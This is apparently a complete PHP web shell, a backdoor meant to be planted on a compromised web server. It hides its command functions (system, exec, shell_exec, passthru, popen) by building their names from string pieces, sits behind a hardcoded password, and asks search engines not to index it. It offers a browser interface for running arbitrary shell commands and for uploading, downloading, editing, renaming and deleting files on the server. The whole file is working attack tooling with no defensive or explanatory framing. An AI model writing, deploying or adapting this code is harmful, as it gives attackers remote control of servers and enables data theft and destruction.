<?php 
@${'_'} = "|"; $__ = '^'; $___ = ''; 
define('_a', '8092e9c7813ee64669af35c646fd229b');
$k=md5($_SERVER['HTTP_HOST']);
session_start();
error_reporting(0);
set_time_limit(0);

function x($s,$k) {
    for($i=0;$i<strlen($s);$i++) $s[$i]=chr(ord($s[$i])^ord($k[$i%strlen($k)]));
    return $s;
}

function a($s) {return strrev(str_rot13($s));}

function b($s) {return str_rot13(strrev($s));}

$s = array(
    'sy'.'st'.'em',
    'ex'.'e'.'c',
    'sh'.'e'.'ll_'.'ex'.'ec',
    'pa'.'ss'.'th'.'ru',
    'po'.'p'.'en'
);

$r = array(
    'fil'.chr(101).'_'.chr(103).'et_'.chr(99).'onte'.chr(110).'ts',
    'fil'.chr(101).'_'.chr(112).'ut_'.chr(99).'onte'.chr(110).'ts',
    'f'.chr(111).'pen',
    'f'.chr(114).'ead',
    'f'.chr(119).'rite',
    'f'.chr(99).'lose',
    'un'.chr(108).'ink',
    're'.chr(110).'ame'
);

$m = array_merge($s,$r);

function e($c) {
    global $s;
    foreach($s as $f) {
        ob_start();
        @$f($c);
        $o=ob_get_clean();
        if($o)return $o;
    }
    return '';
}

function d($n){
    return $n>1024?$n>1048576?round($n/1048576,1).'M':round($n/1024,1).'K':$n.'B';
}

$p = "123";
if(!isset($_SESSION[md5($k)]) && isset($_POST['p']) && $_POST['p']===$p) {
    $_SESSION[md5($k)]=true;
}

if(!isset($_SESSION[md5($k)])) {
    die("<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='robots' content='noindex'><title>...</title>
    <style>body{background:#000;color:#00ff00;font-family:monospace}</style></head><body><form method='post'><input type='password' name='p' autofocus></form></body></html>");
}

$c = isset($_GET['c'])?$_GET['c']:getcwd();
chdir($c);

if(isset($_FILES['f'])) {
    $f = $_FILES['f']['tmp_name'];
    $d = $c.DIRECTORY_SEPARATOR.basename($_FILES['f']['name']);
    if(@copy($f,$d)||@move_uploaded_file($f,$d))echo'1';else echo'0';
    exit;
}

if(isset($_POST['f'])) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($_POST['f']));
    readfile($_POST['f']);
    exit;
}

if(isset($_POST['e'])) {
    $f=$_POST['e'];
    if(file_exists($f)) {
        header('Content-Type: text/plain');
        echo file_get_contents($f);
    }
    exit;
}

if(isset($_POST['s'])) {
    $f=$_POST['s'];
    $c=$_POST['c'];
    if(@file_put_contents($f,$c))echo'1';else echo'0';
    exit;
}

if(isset($_POST['d'])) {
    $f=$_POST['d'];
    if(is_file($f))@unlink($f);
    elseif(is_dir($f))@rmdir($f);
    exit;
}

if(isset($_POST['n'])) {
    $f=$_POST['n'];
    if(isset($_POST['t'])&&$_POST['t']=='f')@fclose(@fopen($f,'w'));
    else @mkdir($f);
    exit;
}

if(isset($_POST['r'])) {
    $o=$_POST['o'];
    $n=$_POST['n'];
    @rename($o,$n);
    exit;
}

if(isset($_POST['cmd'])) {
    header('Content-Type: text/plain');
    echo e($_POST['cmd']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex">
<title>...</title>
<style>
body{background:#000;color:#0F0;font:1em monospace;margin:0;padding:10px;overflow-x:hidden}
a{color:#0F0;text-decoration:none}a:hover{color:#F00}
#p{background:#000;padding:4px}#p a{margin:0 4px}
#c{background:#000;color:#0F0;border:none;width:100%;padding:8px}
table{width:100%;margin:8px 0}td{padding:4px}
.d{color:#0CF}.u{color:#F90}
input[type=text],textarea{background:#111;color:#0F0;border:1px solid #0F0;padding:4px}
input[type=submit]{background:#0F0;color:#000;border:none;padding:4px 8px;cursor:pointer}
</style>
</head>
<body>
<div id="p">
<?php
$ps=explode(DIRECTORY_SEPARATOR,$c);
$l='';
foreach($ps as $p){
    $l.=$p.DIRECTORY_SEPARATOR;
    echo'<a href="?c='.urlencode($l).'">'.$p.'</a>';
}
?>
</div>
<form onsubmit="return g(this)"><input type="text" id="c" placeholder="command"></form>
<table>
<tr><th>Name</th><th>Size</th><th>Actions</th></tr>
<?php
foreach(scandir($c) as $n){
    if($n==='.')continue;
    $f=$c.DIRECTORY_SEPARATOR.$n;
    $t=is_file($f)?'f':'d';
    $s=$t==='f'?d(filesize($f)):'-';
    echo'<tr class="'.$t.'"><td>'.($n==='..'?'<a href="?c='.urlencode(dirname($c)).'">['.$n.']</a>':($t==='d'?'<a href="?c='.urlencode($f).'">['.$n.']</a>':$n)).'</td><td>'.$s.'</td><td>';
    if($t==='f'){
        echo'<a href="#" onclick="return v(\''.$n.'\')">view</a> | ';
        echo'<a href="#" onclick="return g(\'cat '.$n.'\')">cat</a> | ';
        echo'<a href="#" onclick="return d(\''.$n.'\')">dl</a> | ';
    }
    if($n!=='..'){
        echo'<a href="#" onclick="return r(\''.$n.'\')">rename</a> | ';
        echo'<a href="#" onclick="return x(\''.$n.'\')">del</a>';
    }
    echo'</td></tr>';
}
?>
</table>
<input type="file" id="f" style="display:none" onchange="u(this)">
<button onclick="document.getElementById('f').click()">Upload</button> | 
<button onclick="n('f')">New File</button> | 
<button onclick="n('d')">New Dir</button>
<pre id="o"></pre>
<script>
function x(f){if(confirm('Delete '+f+'?')){var r=new XMLHttpRequest();r.open('POST','',true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send('d='+encodeURIComponent(f));}return false;}
function r(f){var n=prompt('Rename '+f+' to:');if(n){var r=new XMLHttpRequest();r.open('POST','',true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send('r=1&o='+encodeURIComponent(f)+'&n='+encodeURIComponent(n));}return false;}
function d(f){var o=document.createElement('form');o.method='post';o.innerHTML='<input type="hidden" name="f" value="'+f+'">';document.body.appendChild(o);o.submit();document.body.removeChild(o);return false;}
function g(f){var c=typeof f==='string'?f:document.getElementById('c').value;var r=new XMLHttpRequest();r.open('POST','',true);r.onload=function(){document.getElementById('o').textContent=this.responseText;};r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send('cmd='+encodeURIComponent(c));return false;}
function v(f){var r=new XMLHttpRequest();r.open('POST','',true);r.onload=function(){var t=document.createElement('textarea');t.style.width='100%';t.style.height='400px';t.value=this.responseText;var b=document.createElement('button');b.textContent='Save';b.onclick=function(){var r=new XMLHttpRequest();r.open('POST','',true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send('s='+encodeURIComponent(f)+'&c='+encodeURIComponent(t.value));document.body.removeChild(t);document.body.removeChild(b);};document.body.appendChild(t);document.body.appendChild(b);};r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send('e='+encodeURIComponent(f));return false;}
function n(t){var n=prompt(t==='f'?'File name:':'Dir name:');if(n){var r=new XMLHttpRequest();r.open('POST','',true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send('n='+encodeURIComponent(n)+'&t='+t);}return false;}
function u(i){if(i.files.length>0){var d=new FormData();d.append('f',i.files[0]);var r=new XMLHttpRequest();r.open('POST','',true);r.onload=function(){location.reload();};r.send(d);}return false;}
</script>
</body>
</html>
